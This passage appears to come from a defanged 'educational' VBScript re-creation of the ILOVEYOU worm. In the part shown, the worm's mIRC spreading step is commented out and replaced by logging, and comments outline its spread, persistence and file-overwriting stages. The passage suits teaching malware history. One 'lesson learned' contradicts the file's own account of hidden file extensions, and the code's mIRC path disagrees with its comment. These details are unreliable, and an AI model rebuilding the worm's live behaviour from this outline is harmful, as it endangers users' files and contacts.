' ============================================================================
' CORE MECHANISM 5: mIRC Chat Client Infection
' ============================================================================
' The worm also spread through mIRC (popular IRC chat client) by:
' 1. Finding the mIRC scripts directory
' 2. Creating a script that would send the worm to other users in chat

Sub InfectMIRC()
    Dim fso, mircDir, scriptFile
    
    On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' mIRC typically installed in: C:\mIRC\ or C:\Program Files\mIRC\
    mircDir = fso.GetSpecialFolder(0) & "\mIRC"
    
    ' ⚠️ EDUCATIONAL SIMULATION - Original code:
    ' If fso.FolderExists(mircDir) Then
    '     scriptFile = mircDir & "\script.ini"
    '     ' Created script.ini that auto-sent worm file to chat contacts
    ' End If
    
    LogAction "SIMULATED: Would check for mIRC installation at: " & mircDir
    LogAction "SIMULATED: Would create malicious script.ini if found"
End Sub

' ============================================================================
' HELPER: Logging Function (Educational Demonstration)
' ============================================================================
Sub LogAction(message)
    Dim logFile, fso, logPath
    
    logPath = "iloveyou_educational_log.txt"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.OpenTextFile(logPath, 8, True) ' 8 = Append mode
    logFile.WriteLine "[" & Now & "] " & message
    logFile.Close
End Sub

' ============================================================================
' MAIN EXECUTION FLOW
' ============================================================================
' In the original worm, these functions executed in sequence:

Sub Main()
    LogAction "============================================"
    LogAction "EDUCATIONAL ILOVEYOU WORM DEMONSTRATION"
    LogAction "Date: " & Now
    LogAction "============================================"
    
    ' Step 1: Replicate to system directories
    LogAction "--- PHASE 1: Self-Replication ---"
    Call ReplicateToSystem()
    
    ' Step 2: Establish registry persistence
    LogAction "--- PHASE 2: Persistence ---"
    Call EstablishPersistence()
    
    ' Step 3: Spread via email to all contacts
    LogAction "--- PHASE 3: Email Propagation ---"
    Call SpreadViaEmail()
    
    ' Step 4: Overwrite local files
    LogAction "--- PHASE 4: File Destruction ---"
    Call OverwriteFiles()
    
    ' Step 5: Infect mIRC chat client
    LogAction "--- PHASE 5: mIRC Infection ---"
    Call InfectMIRC()
    
    LogAction "============================================"
    LogAction "DEMONSTRATION COMPLETE"
    LogAction "No actual harm was done - this is educational"
    LogAction "============================================"
    
    ' Display message box (original behavior)
    ' MsgBox "ILOVEYOU 😍", vbInformation, "Educational Demonstration"
End Sub

' Execute main function
Call Main()

' ============================================================================
' KEY VULNERABILITIES EXPLOITED:
' =============================
' 1. SOCIAL ENGINEERING: Romantic subject line tricked users into clicking
' 2. FILE EXTENSION HIDING: Windows hid .vbs extension by default
'    - File appeared as "LOVE-LETTER-FOR-YOU.TXT" but was actually ".vbs"
' 3. OUTLOOK SECURITY: No confirmation required to send emails programmatically
' 4. SCRIPT EXECUTION: VBScript could run without warnings by default
' 5. LACK OF ANTIVIRUS: Signature-based detection couldn't catch this new threat
'
' LESSONS LEARNED:
' ================
' 1. Microsoft changed default behavior to hide known file extensions
' 2. Outlook added security prompts for programmatic email access
' 3. Script execution controls were tightened in Windows
' 4. Email providers implemented attachment scanning
' 5. Security awareness training became more prominent
' ============================================================================
